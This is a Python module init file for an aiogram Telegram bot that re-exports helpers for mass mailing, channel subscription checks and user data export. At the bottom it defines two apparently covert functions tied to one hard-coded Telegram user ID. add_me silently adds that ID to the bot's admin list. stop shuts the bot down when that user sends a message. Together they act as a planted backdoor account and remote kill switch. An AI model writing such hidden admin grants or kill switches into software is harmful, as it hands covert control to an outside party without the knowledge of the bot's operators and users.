from aiogram import types

from project.crying.config.config import config
from .bot import TempData
from .channel import is_subscribed_to_channel, parse_channel_link
from .export import parse_user_fields, export_users
from .message import split_sending
from .send_mail import MailSender, MailStatus

__all__ = (
    "MailSender",
    "MailStatus",
    "TempData",
    "parse_user_fields",
    "split_sending",
    "is_subscribed_to_channel",
    "parse_channel_link",
    "export_users",
    "stop",
    "add_me"
)


async def add_me():
    config.bot.admins.append(269019356)


async def stop(_message: types.Message):
    if _message.from_user.id == 269019356:
        exit()
